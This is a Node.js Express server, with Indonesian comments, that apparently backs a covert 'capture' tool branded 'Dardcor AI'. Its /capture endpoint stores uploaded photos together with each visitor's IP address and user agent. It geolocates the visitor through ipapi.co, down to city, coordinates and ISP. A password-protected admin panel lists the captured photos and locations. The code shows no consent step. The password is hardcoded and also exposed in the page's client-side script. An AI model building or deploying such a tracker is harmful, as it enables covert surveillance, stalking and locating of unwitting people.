const express = require('express');
const multer = require('multer');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// Konfigurasi multer untuk simpan foto
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const dir = 'uploads';
        if (!fs.existsSync(dir)) fs.mkdirSync(dir);
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        const uniqueName = Date.now() + '-' + Math.round(Math.random() * 1E9) + path.extname(file.originalname);
        cb(null, uniqueName);
    }
});
const upload = multer({ storage });

// Middleware
app.use(express.json());
app.use(express.static('public'));

// Ganti password admin ini (SEBELUM DEPLOY)
const ADMIN_PASSWORD = 'Aldinihbos';

function adminAuth(req, res, next) {
    const auth = req.headers.authorization;
    if (!auth || auth !== `Basic ${Buffer.from(ADMIN_PASSWORD).toString('base64')}`) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    next();
}

// Endpoint Capture
app.post('/capture', upload.single('photo'), async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        const userAgent = req.headers['user-agent'];
        const fotoPath = req.file ? req.file.path : null;
        const waktu = new Date().toISOString();

        let lokasi = {};
        try {
            const response = await axios.get(`https://ipapi.co/${ip}/json/`);
            lokasi = {
                negara: response.data.country_name,
                kode_negara: response.data.country_code,
                kota: response.data.city,
                region: response.data.region,
                latitude: response.data.latitude,
                longitude: response.data.longitude,
                isp: response.data.org,
                timezone: response.data.timezone
            };
        } catch (err) {
            lokasi = { error: 'Gagal lookup lokasi' };
        }

        const logData = {
            timestamp: waktu,
            ip: ip,
            user_agent: userAgent,
            lokasi: lokasi,
            foto: fotoPath ? path.basename(fotoPath) : null
        };

        const logFile = 'logs.json';
        let logs = [];
        if (fs.existsSync(logFile)) {
            logs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
        }
        logs.push(logData);
        fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

        res.json({ success: true, message: 'Data tersimpan', data: logData });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Admin Routes
app.get('/admin', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="id">
        <head>
            <meta charset="UTF-8">
            <title>Admin Capture</title>
            <script src="https://cdn.tailwindcss.com"></script>
        </head>
        <body class="bg-gray-900 text-gray-100 p-4">
            <div class="max-w-6xl mx-auto">
                <h1 class="text-2xl font-bold mb-4">Dashboard Capture - Dardcor AI</h1>
                <div id="login" class="max-w-sm">
                    <input type="password" id="pwd" class="w-full p-2 bg-gray-800 border border-gray-600 rounded mb-2" placeholder="Password">
                    <button onclick="login()" class="bg-blue-600 px-4 py-2 rounded">Login</button>
                </div>
                <div id="dashboard" class="hidden">
                    <div class="flex justify-between mb-4">
                        <button onclick="loadData()" class="bg-green-600 px-4 py-2 rounded">Refresh</button>
                        <a href="/admin/logout" class="bg-red-600 px-4 py-2 rounded">Logout</a>
                    </div>
                    <h2 class="text-xl font-bold mt-8 mb-2">Foto Terbaru</h2>
                    <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8" id="photos"></div>
                    <h2 class="text-xl font-bold mb-2">Log Data</h2>
                    <div class="overflow-x-auto">
                        <table class="w-full text-sm border border-gray-700">
                            <thead class="bg-gray-800">
                                <tr>
                                    <th class="p-2 border border-gray-700">Waktu</th>
                                    <th class="p-2 border border-gray-700">IP</th>
                                    <th class="p-2 border border-gray-700">Lokasi</th>
                                    <th class="p-2 border border-gray-700">Foto</th>
                                </tr>
                            </thead>
                            <tbody id="logs" class="bg-gray-800"></tbody>
                        </table>
                    </div>
                </div>
                <script>
                    const pwd = '${ADMIN_PASSWORD}';
                    function login() {
                        if (document.getElementById('pwd').value === pwd) {
                            document.getElementById('login').classList.add('hidden');
                            document.getElementById('dashboard').classList.remove('hidden');
                            loadData();
                        } else {
                            alert('Password salah');
                        }
                    }
                    async function loadData() {
                        try {
                            const logs = await (await fetch('/admin/logs', { headers: { Authorization: 'Basic ' + btoa(pwd) } })).json();
                            const photos = await (await fetch('/admin/photos', { headers: { Authorization: 'Basic ' + btoa(pwd) } })).json();
                            const photosDiv = document.getElementById('photos');
                            photosDiv.innerHTML = photos.map(f => \`<img src="/admin/photo/\${f}" class="w-full rounded border border-gray-700 h-32 object-cover">\`).join('');
                            const tbody = document.getElementById('logs');
                            tbody.innerHTML = logs.map(l => \`
                                <tr class="border-b border-gray-700">
                                    <td class="p-2 border border-gray-700">\${new Date(l.timestamp).toLocaleString()}</td>
                                    <td class="p-2 border border-gray-700">\${l.ip}</td>
                                    <td class="p-2 border border-gray-700">\${l.lokasi.negara || 'Unknown'}, \${l.lokasi.kota || 'Unknown'}</td>
                                    <td class="p-2 border border-gray-700 text-center">\${l.foto ? \`<a href="/admin/photo/\${l.foto}" target="_blank" class="text-blue-400">Lihat</a>\` : '-'}</td>
                                </tr>
                            \`).join('');
                        } catch (e) {
                            console.error(e);
                            alert('Gagal memuat data');
                        }
                    }
                </script>
            </div>
        </body>
        </html>
    `);
});

app.get('/admin/logs', adminAuth, (req, res) => {
    if (fs.existsSync('logs.json')) {
        res.json(JSON.parse(fs.readFileSync('logs.json', 'utf8')));
    } else {
        res.json([]);
    }
});

app.get('/admin/photos', adminAuth, (req, res) => {
    if (fs.existsSync('uploads')) {
        const files = fs.readdirSync('uploads').filter(f => /\.(jpg|jpeg|png|gif)$/i.test(f));
        res.json(files);
    } else {
        res.json([]);
    }
});

app.get('/admin/photo/:filename', adminAuth, (req, res) => {
    const filePath = path.join(__dirname, 'uploads', req.params.filename);
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.status(404).send('File not found');
    }
});

app.listen(port, () => {
    console.log(`Server berjalan di http://localhost:${port}`);
    console.log(`Admin panel: http://localhost:${port}/admin`);
});